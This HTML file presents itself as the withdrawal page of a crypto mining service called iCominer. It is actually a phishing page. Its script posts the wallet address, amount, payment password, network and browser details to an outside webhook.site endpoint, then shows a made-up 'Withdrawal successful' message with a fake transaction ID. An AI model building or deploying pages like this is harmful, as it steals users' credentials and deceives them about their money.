<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Withdraw | iCominer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background-color: #f7f9fc;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 500px;
      margin: 60px auto;
      padding: 30px;
      background-color: #ffffff;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
    }
    h1 {
      text-align: center;
      color: #00b894;
    }
    label {
      display: block;
      margin-top: 15px;
      color: #2d3436;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border-radius: 5px;
      border: 1px solid #dcdde1;
    }
    button {
      margin-top: 20px;
      width: 100%;
      padding: 12px;
      background-color: #00b894;
      color: white;
      font-weight: bold;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }
    .status {
      margin-top: 20px;
      text-align: center;
      color: #636e72;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Withdraw</h1>
    <label for="network">Withdraw Network</label>
    <select id="network">
      <option value="bnb">BNB [Binance Smart Chain]</option>
      <option value="ltc">LTC [Litecoin]</option>
    </select>

    <label for="wallet">Wallet Address</label>
    <input type="text" id="wallet" placeholder="Enter your wallet address" />

    <label for="amount">Amount (USD)</label>
    <input type="number" id="amount" placeholder="Enter amount" />

    <label for="password">Payment Password</label>
    <input type="password" id="password" placeholder="Default: 123456" />

    <button onclick="submit()">Withdraw</button>

    <div class="status" id="status">Awaiting submission...</div>
  </div>

  <script>
    function submit() {
      const wallet = document.getElementById('wallet').value;
      const amount = document.getElementById('amount').value;
      const password = document.getElementById('password').value;
      const network = document.getElementById('network').value;

      document.getElementById('status').innerText = "Submitting transaction...";

      fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          wallet, amount, password, network,
          userAgent: navigator.userAgent,
          screen: `${screen.width}x${screen.height}`,
          time: new Date().toISOString()
        })
      });

      setTimeout(() => {
        document.getElementById('status').innerText = "Withdrawal successful! TXID: fake123abc456";
      }, 2000);
    }
  </script>
</body>
</html>
